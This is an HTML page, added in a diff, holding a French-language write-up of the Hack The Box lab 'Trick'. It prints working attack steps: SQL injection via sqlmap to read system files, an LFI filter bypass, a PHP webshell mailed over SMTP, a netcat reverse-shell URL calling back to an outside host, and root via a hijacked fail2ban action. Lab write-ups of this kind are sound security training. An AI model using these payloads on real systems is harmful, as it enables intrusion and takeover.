@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trick - Write-up HTB (Easy)</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            overflow: hidden;
+            backdrop-filter: blur(10px);
+        }
+
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+
+        .header .info {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            font-size: 1.1em;
+            opacity: 0.9;
+        }
+
+        .content {
+            padding: 40px;
+        }
+
+        h2 {
+            color: #2c3e50;
+            font-size: 1.8em;
+            margin: 30px 0 20px 0;
+            padding-bottom: 10px;
+            border-bottom: 3px solid #3498db;
+            position: relative;
+        }
+
+        h2::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            bottom: -3px;
+            width: 50px;
+            height: 3px;
+            background: linear-gradient(90deg, #3498db, #e74c3c);
+        }
+
+        h3 {
+            color: #34495e;
+            font-size: 1.4em;
+            margin: 25px 0 15px 0;
+            padding-left: 20px;
+            position: relative;
+        }
+
+        h3::before {
+            content: '→';
+            position: absolute;
+            left: 0;
+            color: #3498db;
+            font-weight: bold;
+        }
+
+        p {
+            margin-bottom: 15px;
+            text-align: justify;
+        }
+
+        ul {
+            list-style: none;
+            margin-bottom: 20px;
+        }
+
+        ul li {
+            padding: 8px 0;
+            padding-left: 25px;
+            position: relative;
+        }
+
+        ul li::before {
+            content: '🔹';
+            position: absolute;
+            left: 0;
+            font-size: 1.1em;
+        }
+
+        pre {
+            background: #2c3e50;
+            color: #ecf0f1;
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            overflow-x: auto;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            position: relative;
+        }
+
+        code {
+            background: #34495e;
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            color: #f8f9fa;
+        }
+
+        .terminal {
+            border-left: 5px solid #27ae60;
+        }
+
+        .terminal::before {
+            content: 'kali@kali:~$ ';
+            color: #27ae60;
+            font-weight: bold;
+        }
+
+        .url {
+            background: #1a1a2e;
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid #3498db;
+            font-family: monospace;
+            color: #3498db;
+            word-break: break-all;
+        }
+
+        .highlight {
+            background: linear-gradient(120deg, #a8edea 0%, #fed6e3 100%);
+            padding: 15px;
+            border-radius: 8px;
+            border-left: 5px solid #e74c3c;
+            margin: 20px 0;
+        }
+
+        .footer {
+            background: #34495e;
+            color: #bdc3c7;
+            text-align: center;
+            padding: 20px;
+            margin-top: 40px;
+        }
+
+        @media (max-width: 768px) {
+            .header .info {
+                flex-direction: column;
+                gap: 10px;
+            }
+            
+            .content {
+                padding: 20px;
+            }
+            
+            h1 {
+                font-size: 2em;
+            }
+        }
+
+        .success {
+            color: #27ae60;
+            font-weight: bold;
+        }
+
+        .warning {
+            color: #f39c12;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🎯 Trick - HTB Write-up</h1>
+            <div class="info">
+                <span>Difficulty: <span class="success">Easy</span></span>
+                <span>OS: Linux</span>
+                <span>Skills: DNS, SQLi, LFI, Fail2ban</span>
+            </div>
+        </div>
+
+        <div class="content">
+            <h2>1. Objectif de la machine</h2>
+            <p>Trick combine DNS enumeration, SQL injection pour lire des fichiers système, LFI pour RCE via mail SMTP, et élévation via fail2ban mal configuré.</p>
+
+            <h2>2. Enumeration réseau</h2>
+
+            <h3>Nmap Scan</h3>
+            <pre class="terminal"><code>ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.166 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
+nmap -p$ports -sC -sV 10.10.11.166</code></pre>
+            
+            <ul>
+                <li><strong>22/tcp</strong>: SSH OpenSSH 7.9p1</li>
+                <li><strong>25/tcp</strong>: SMTP Postfix</li>
+                <li><strong>53/tcp</strong>: DNS ISC BIND</li>
+                <li><strong>80/tcp</strong>: HTTP Nginx</li>
+            </ul>
+
+            <h2>3. DNS Enumeration</h2>
+
+            <h3>Reverse Lookup</h3>
+            <pre class="terminal"><code>dig @10.10.11.166 -x 10.10.11.166</code></pre>
+            <div class="highlight">
+                <strong>Résultat:</strong> <code>trick.htb</code><br>
+                Ajout dans /etc/hosts: <code>10.10.11.166 trick.htb</code>
+            </div>
+
+            <h3>Zone Transfer</h3>
+            <pre class="terminal"><code>dig @10.10.11.166 axfr trick.htb</code></pre>
+            <div class="highlight">
+                <strong>Nouveau vHost:</strong> <code>preprod-payroll.trick.htb</code>
+            </div>
+
+            <h2>4. SQL Injection (Payroll)</h2>
+
+            <h3>Détection</h3>
+            <pre class="terminal"><code>sqlmap -u "http://preprod-payroll.trick.htb/ajax.php?action=login" \
+  --data="username=abc&password=abc" -p username --batch</code></pre>
+            <div class="highlight">
+                <span class="success">✅ Boolean-based + Error-based SQLi détectées</span>
+            </div>
+
+            <h3>Lecture fichiers (FILE priv)</h3>
+            <pre class="terminal"><code>sqlmap ... --file-read=/etc/passwd
+sqlmap ... --file-read=/etc/nginx/sites-enabled/default</code></pre>
+            <ul>
+                <li><code>michael</code> utilisateur trouvé</li>
+                <li><strong>Nouveau vHost:</strong> <code>preprod-marketing.trick.htb</code></li>
+            </ul>
+
+            <h2>5. LFI (Marketing)</h2>
+            <div class="url">
+                http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//etc/passwd
+            </div>
+            <div class="highlight">
+                <span class="success">✅ LFI confirmée (bypass ../ avec ....//)</span>
+            </div>
+
+            <h2>6. Foothold (LFI + SMTP)</h2>
+
+            <h3>Mail avec webshell</h3>
+            <pre class="terminal"><code>nc trick.htb 25
+helo x
+mail from: attacker@attacker.com
+rcpt to: michael@trick.htb
+data
+&lt;?php system($_GET['cmd']); ?&gt;
+.</code></pre>
+
+            <h3>Exécution reverse shell</h3>
+            <pre class="terminal"><code>nc -lvnp 1337</code></pre>
+            <div class="url">
+                http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//var/mail/michael&amp;cmd=nc%2010.10.14.29%201337%20-e%20/bin/sh
+            </div>
+            <div class="highlight">
+                <span class="success">✅ Shell michael obtenu</span>
+            </div>
+
+            <h2>7. SSH stable</h2>
+            <pre class="terminal"><code>ssh -i michael_id_rsa michael@trick.htb</code></pre>
+
+            <h2>8. Privilege Escalation</h2>
+
+            <h3>Sudo rights</h3>
+            <pre class="terminal"><code>sudo -l
+(root) NOPASSWD: /etc/init.d/fail2ban restart</code></pre>
+
+            <h3>Fail2ban Hijack</h3>
+            <pre class="terminal"><code>cd /etc/fail2ban/action.d/
+mv iptables-multiport.conf .old
+cp .old iptables-multiport.conf
+# Éditer: actionban = /tmp/shell.sh
+chmod +x /tmp/shell.sh
+sudo /etc/init.d/fail2ban restart</code></pre>
+
+            <div class="highlight">
+                <span class="success">🎉 ROOT via fail2ban ban trigger !</span>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>HTB Trick Write-up | Generated for Cybersecurity Student | Feb 2026</p>
+        </div>
+    </div>
+</body>
+</html>
